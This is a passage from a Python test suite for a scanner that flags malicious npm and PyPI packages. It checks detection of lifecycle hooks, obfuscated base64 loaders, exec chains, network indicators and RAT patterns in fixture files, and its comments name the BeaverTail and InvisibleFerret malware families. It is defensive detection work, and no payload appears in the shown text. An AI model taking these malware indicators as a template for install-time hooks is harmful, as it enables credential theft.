                description="high",
                matched_text="match",
                remediation="fix",
                tags=frozenset(),
            )
        ]
        assert findings_have_severity(findings, "high") is True

    def test_findings_have_severity_critical_with_only_high(self) -> None:
        findings = [
            Finding(
                severity="high",
                file_path="f.js",
                line_number=1,
                pattern_id="HIGH_PAT",
                description="high",
                matched_text="match",
                remediation="fix",
                tags=frozenset(),
            )
        ]
        assert findings_have_severity(findings, "critical") is False


# ---------------------------------------------------------------------------
# Fixture file tests
# ---------------------------------------------------------------------------


class TestFixtureFiles:
    """Integration tests using the fixture files in tests/fixtures/."""

    def test_malicious_package_json_exists(self) -> None:
        assert (FIXTURES_DIR / "malicious_package.json").exists()

    def test_malicious_setup_py_exists(self) -> None:
        assert (FIXTURES_DIR / "malicious_setup.py").exists()

    def test_malicious_package_json_detects_lifecycle_hooks(self) -> None:
        content = (FIXTURES_DIR / "malicious_package.json").read_text(encoding="utf-8")
        findings = detect_lifecycle_hooks(content, "package.json")
        assert len(findings) > 0, "Expected lifecycle hook findings in malicious_package.json"

    def test_malicious_package_json_detects_suspicious_packages(self) -> None:
        content = (FIXTURES_DIR / "malicious_package.json").read_text(encoding="utf-8")
        findings = detect_suspicious_packages(content, "package.json")
        assert len(findings) > 0, (
            "Expected suspicious package findings in malicious_package.json"
        )

    def test_malicious_package_json_has_critical_findings(self) -> None:
        content = (FIXTURES_DIR / "malicious_package.json").read_text(encoding="utf-8")
        findings = detect_all(content, "package.json")
        assert findings_have_severity(findings, "critical"), (
            "Expected at least one critical finding in malicious_package.json"
        )

    def test_malicious_setup_py_detects_exec_patterns(self) -> None:
        content = (FIXTURES_DIR / "malicious_setup.py").read_text(encoding="utf-8")
        findings = detect_eval_exec_chains(content, "setup.py")
        assert len(findings) > 0, "Expected exec chain findings in malicious_setup.py"

    def test_malicious_setup_py_detects_lifecycle_hooks(self) -> None:
        content = (FIXTURES_DIR / "malicious_setup.py").read_text(encoding="utf-8")
        findings = detect_lifecycle_hooks(content, "setup.py")
        assert len(findings) > 0, "Expected lifecycle hook findings in malicious_setup.py"

    def test_malicious_setup_py_has_critical_findings(self) -> None:
        content = (FIXTURES_DIR / "malicious_setup.py").read_text(encoding="utf-8")
        findings = detect_all(content, "setup.py")
        assert findings_have_severity(findings, "critical"), (
            "Expected at least one critical finding in malicious_setup.py"
        )

    def test_malicious_package_json_is_valid_json(self) -> None:
        content = (FIXTURES_DIR / "malicious_package.json").read_text(encoding="utf-8")
        data = json.loads(content)  # must not raise
        assert "name" in data
        assert "scripts" in data

    def test_malicious_package_json_contains_rat_tool_dep(self) -> None:
        content = (FIXTURES_DIR / "malicious_package.json").read_text(encoding="utf-8")
        findings = detect_all(content, "package.json")
        # keytar is a BeaverTail dependency
        keytar_findings = [
            f for f in findings if "BT_JS_KEYTAR_ABUSE" in f.pattern_id
        ]
        assert keytar_findings, "Expected keytar finding from malicious_package.json"

    def test_malicious_setup_py_detects_network_iocs(self) -> None:
        content = (FIXTURES_DIR / "malicious_setup.py").read_text(encoding="utf-8")
        findings = detect_network_iocs(content, "setup.py")
        assert len(findings) > 0, "Expected network IOC findings in malicious_setup.py"

    def test_malicious_package_json_all_findings_have_fields(self) -> None:
        content = (FIXTURES_DIR / "malicious_package.json").read_text(encoding="utf-8")
        findings = detect_all(content, "package.json")
        for f in findings:
            assert f.severity in {"critical", "high", "medium", "info"}
            assert f.file_path == "package.json"
            assert isinstance(f.line_number, int)
            assert f.line_number >= 1
            assert isinstance(f.pattern_id, str) and f.pattern_id
            assert isinstance(f.description, str)
            assert isinstance(f.matched_text, str)
            assert isinstance(f.remediation, str)
            assert isinstance(f.tags, frozenset)

    def test_malicious_setup_py_obfuscated_loader_detected(self) -> None:
        content = (FIXTURES_DIR / "malicious_setup.py").read_text(encoding="utf-8")
        findings = detect_obfuscated_loaders(content, "setup.py")
        # The fixture contains a long base64 payload
        assert len(findings) > 0, "Expected obfuscated loader findings in malicious_setup.py"

    def test_malicious_setup_py_rat_patterns_detected(self) -> None:
        content = (FIXTURES_DIR / "malicious_setup.py").read_text(encoding="utf-8")
        findings = detect_rat_patterns(content, "setup.py")
        # InvisibleFerret patterns should be present
        assert len(findings) > 0, "Expected RAT pattern findings in malicious_setup.py"
